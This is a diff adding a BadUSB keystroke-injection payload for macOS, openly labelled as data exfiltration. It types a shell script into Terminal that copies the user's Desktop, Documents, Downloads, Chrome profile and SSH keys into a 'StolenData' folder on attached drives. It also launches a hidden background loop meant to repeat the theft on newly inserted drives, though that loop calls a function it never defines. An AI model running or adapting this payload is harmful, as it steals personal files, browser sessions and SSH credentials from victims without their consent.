@@ -1,0 +1,99 @@
+REM Title: macOS USB Data Copier
+REM Author: BadUSB Library
+REM Description: Copies sensitive data to connected USB drives
+REM Target: macOS 10.15+
+REM Category: Data Exfiltration
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create USB data copier script
+STRING cat > /tmp/usb_copier.sh << 'EOF'
+#!/bin/bash
+
+# Function to copy data to USB
+copy_to_usb() {
+    local usb_path="$1"
+    local target_dir="$usb_path/StolenData_$(date +%Y%m%d_%H%M%S)"
+    
+    mkdir -p "$target_dir"
+    
+    echo "Copying data to USB: $target_dir"
+    
+    # Copy Desktop
+    if [ -d ~/Desktop ]; then
+        cp -r ~/Desktop "$target_dir/"
+    fi
+    
+    # Copy Documents
+    if [ -d ~/Documents ]; then
+        cp -r ~/Documents "$target_dir/"
+    fi
+    
+    # Copy Downloads
+    if [ -d ~/Downloads ]; then
+        cp -r ~/Downloads "$target_dir/"
+    fi
+    
+    # Copy browser data
+    if [ -d ~/Library/Application\ Support/Google/Chrome/Default ]; then
+        cp -r ~/Library/Application\ Support/Google/Chrome/Default "$target_dir/chrome_data"
+    fi
+    
+    # Copy SSH keys
+    if [ -d ~/.ssh ]; then
+        cp -r ~/.ssh "$target_dir/"
+    fi
+    
+    # Create system info file
+    system_profiler SPSoftwareDataType > "$target_dir/system_info.txt"
+    system_profiler SPHardwareDataType >> "$target_dir/system_info.txt"
+    
+    echo "Data copied successfully to: $target_dir"
+}
+
+# Find USB drives
+echo "Looking for USB drives..."
+for drive in /Volumes/*; do
+    if [ -d "$drive" ] && [ "$drive" != "/Volumes/Macintosh HD" ]; then
+        echo "Found USB drive: $drive"
+        copy_to_usb "$drive"
+    fi
+done
+
+# Also create a persistent version
+cat > /tmp/usb_monitor.sh << 'MONITOR_EOF'
+#!/bin/bash
+
+# Monitor for new USB drives
+while true; do
+    for drive in /Volumes/*; do
+        if [ -d "$drive" ] && [ "$drive" != "/Volumes/Macintosh HD" ]; then
+            if [ ! -f "$drive/.copied" ]; then
+                echo "New USB drive detected: $drive"
+                copy_to_usb "$drive"
+                touch "$drive/.copied"
+            fi
+        fi
+    done
+    sleep 10
+done
+MONITOR_EOF
+
+chmod +x /tmp/usb_monitor.sh
+nohup /tmp/usb_monitor.sh > /dev/null 2>&1 &
+
+EOF
+ENTER
+
+REM Make executable and run
+STRING chmod +x /tmp/usb_copier.sh
+ENTER
+STRING /tmp/usb_copier.sh
+ENTER
